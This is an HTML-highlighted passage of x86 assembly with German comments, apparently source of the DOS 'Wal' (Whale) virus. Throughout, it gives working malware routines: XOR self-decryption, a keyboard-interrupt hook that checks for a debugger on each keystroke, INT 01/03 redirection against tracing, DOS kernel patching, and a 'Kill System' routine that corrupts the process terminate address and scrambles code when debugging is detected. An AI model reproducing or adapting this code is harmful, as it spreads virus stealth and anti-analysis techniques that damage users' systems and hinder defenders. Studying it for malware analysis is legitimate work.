                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">StopTrace</span><span class="sc0">                      </span><span class="sc1">; [D2450] &lt; 1 ?</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24DF</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SS</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24DD</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J0488D</span><span class="sc0">                  </span><span class="sc1">; -&gt; RET hier irgendwo</span><span class="sc0">
</span><span class="sc1">;==========================================( Trace-Mode abschalten)===</span><span class="sc0">
</span><span class="sc5">StopTrace</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">],</span><span class="sc2">0FEFFh</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J049EA</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J04A1B</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2450</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Dec (Versuche)</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J049EA</span><span class="sc0">                        </span><span class="sc1">; &lt;&gt; 0 -&gt; weiter</span><span class="sc0">
                </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">],</span><span class="sc2">0FEFFh</span><span class="sc0">      </span><span class="sc1">; sonst tracen</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SaveRegisters</span><span class="sc0">                 </span><span class="sc1">; stoppen und :</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=======================( AUS : )=====================================</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J04A2A</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0fch</span><span class="sc4">,</span><span class="sc2">01eh</span><span class="sc4">,</span><span class="sc2">0e2h</span><span class="sc4">,</span><span class="sc2">0e4h</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;========================( WIRD, Åber PATCH )=========================</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
                </span><span class="sc1">;CALL    J02CDA</span><span class="sc0">
                </span><span class="sc1">;IN      AL,40h</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;===============================================( XOR-Byte Ñndern )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">XorByte__1</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">           </span><span class="sc1">; D_4A5E</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">XorByte__2</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">           </span><span class="sc1">; D_4A79</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=====================================( INT 01 auf INT 03 stellen )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J04A39</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetInt_AL</span><span class="sc0">       </span><span class="sc1">; GET INT 3</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">; DS:DX auf INT 3 stellen</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc1">;=================================================================</span><span class="sc0">
</span><span class="sc1">;======( AUS : )==================================================</span><span class="sc0">
</span><span class="sc1">;=================================================================</span><span class="sc0">
</span><span class="sc5">J04A42</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0e8h</span><span class="sc4">,</span><span class="sc2">027h</span><span class="sc0">
</span><span class="sc5">J04A44</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">01h</span><span class="sc0">             </span><span class="sc1">; CALL    J04B6C</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EAh</span><span class="sc4">,</span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc2">0e1h</span><span class="sc0">  </span><span class="sc1">; JB      J04A29</span><span class="sc0">
</span><span class="sc1">;=================================================================</span><span class="sc0">
</span><span class="sc1">;===================( Wird Åber PATCH )===========================</span><span class="sc0">
</span><span class="sc1">;=================================================================</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SetInt_AL</span><span class="sc0">       </span><span class="sc1">; INT 01 auf INT 03 setzen</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">POPALL</span><span class="sc0">
</span><span class="sc1">;^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Patch_IBMDOS</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetRegsFromVirstack</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Re_SET_Int_02</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc0">              </span><span class="sc1">; Stack putzen</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">PART_____1</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">LEN_PART_1</span><span class="sc0">
</span><span class="sc5">J04A5B</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">8Eh</span><span class="sc0">
</span><span class="sc5">D_4A5E</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J04A5B</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">IRET</span><span class="sc0">                    </span><span class="sc1">; ENDE von INT 01 / Tracer</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0E9h</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;================================================( INT 21-Handler )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J04A66</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">PART_____1</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">; = D4BAC</span><span class="sc0">
                                           </span><span class="sc1">; ist Wal schon DEkodiert ?</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J04A7F</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">                 </span><span class="sc1">; Nein.</span><span class="sc0">
</span><span class="sc5">J04A6F</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">PART_____1</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">LEN_PART_1</span><span class="sc0">
</span><span class="sc5">J04A76</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">8EH</span><span class="sc0">
</span><span class="sc5">D_4A79</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J04A76</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
</span><span class="sc5">J04A7F</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J0458D</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">34h</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=======================(              INT 09-Handler             )===</span><span class="sc0">
</span><span class="sc1">;=======================( Bei jedem (!) Tastendruck wird geprÅft, )===</span><span class="sc0">
</span><span class="sc1">;=======================( ob ein Debugger am Werk ist !           )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J04A83</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">92</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Patch_INT_09</span><span class="sc0">   </span><span class="sc1">; INT 9 restaurieren</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Debugger_Check</span><span class="sc0"> </span><span class="sc1">; Das ist der Witz dabei !!!</span><span class="sc0">
                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">INT_09</span><span class="sc0">  </span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; CALL INT 09</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Patch_INT_09</span><span class="sc0">   </span><span class="sc1">; Int 9 wieder patchen</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">92</span><span class="sc0">
                </span><span class="sc6">IRET</span><span class="sc0">
</span><span class="sc1">;=======================================================()=========</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0BCH</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=======================================( Save Original-Registers )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">SaveRegs</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2575</span><span class="sc4">],</span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2577</span><span class="sc4">],</span><span class="sc8">DI</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D257B</span><span class="sc4">],</span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D257D</span><span class="sc4">],</span><span class="sc8">ES</span><span class="sc0">
</span><span class="sc5">J04AB1</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2579</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D257F</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2581</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2590</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
                </span><span class="sc1">;-----------------------------------------------------</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0E8h</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=============================( PATCHT vorhandenen INT 09-Handler )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">KeyBoard</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Patch_INT_09</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">93</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">D2570</span><span class="sc0">
                </span><span class="sc6">LES</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">INT_09</span><span class="sc0">  </span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; GET original INT 09</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">
</span><span class="sc1">;---------------------------( Tauscht 5 Byte ab CS:D2570  -&gt; ES:DI )--</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0005h</span><span class="sc0">
</span><span class="sc5">J04ADD</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">LODSB</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J04ADD</span><span class="sc0">
</span><span class="sc1">;----------------------------------------( anzeige )-------------------</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0B800H</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Keyboard</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Keyboard</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">432EH</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">ToOriginal</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Keyboard</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4b57h</span><span class="sc0">
</span><span class="sc5">ToOriginal</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">STOSW</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">RestoreRegs</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">93</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;====================================(    GET INT 01 + INT 03     )===</span><span class="sc0">
</span><span class="sc1">;====================================( Check, ob Debugger werkelt )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">Debugger_Check</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">94</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2581</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D257D</span><span class="sc4">],</span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0006h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; GET Offset von INT 01</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2447</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">J04B27</span><span class="sc0">                  </span><span class="sc1">; TRACER   AM WERK</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">000Eh</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; GET Offset von INT 03</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2447</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">J04B27</span><span class="sc0">                  </span><span class="sc1">; DEBUGGER AM WERK</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D257D</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2581</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J04B76</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=================================================( Kill System ! )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J04B27</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">                       </span><span class="sc1">; POP returnadresse</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PushALL</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Patch_IBMDOS</span><span class="sc0">             </span><span class="sc1">; DOS patchen</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PopALL</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2581</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D257D</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">INT_09</span><span class="sc0">  </span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; CALL INT 09</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PushALL</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">51h</span><span class="sc0">                    </span><span class="sc1">; get current PSP</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
</span><span class="sc5">J04B4D</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">000Ch</span><span class="sc4">],</span><span class="sc2">0FFFFh</span><span class="sc1">; Terminate-Adresse</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">000Ah</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0"> </span><span class="sc1">; ist FFFF:0000 !?!</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PopALL</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">
                </span><span class="sc1">;---------------------------------( Wal zerstîren )---</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">IfDebugWal</span><span class="sc0">   </span><span class="sc1">; 1185h   ; 230Ah Byte</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">StartDebug</span><span class="sc0">   </span><span class="sc1">; 004Fh   ; ab 4Fh / 285Fh</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0802h</span><span class="sc0">        </span><span class="sc1">; mit 0802h verORen</span><span class="sc0">
</span><span class="sc5">J04B6A</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; bis 4B69 , logisch, oder ....</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J04B6A</span><span class="sc0">
                </span><span class="sc1">;----------------------------------------------------</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">RestoreRegs</span><span class="sc0">
                </span><span class="sc6">IRET</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=========================================( Kein Debugger am Werk )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J04B76</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">94</span><span class="sc0">
                </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">D4B7C</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0E8h</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=========( Verwischt Spuren und springt in oberen Speicherbereich)===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">Schwimme_Fort</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">15h</span><span class="sc0"> </span><span class="sc1">; CX = 236Ch</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">                   </span><span class="sc1">; BX = 0</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">Schwimme_Fort</span><span class="sc0">        </span><span class="sc1">; also von 2810 bis D4B7C</span><span class="sc0">
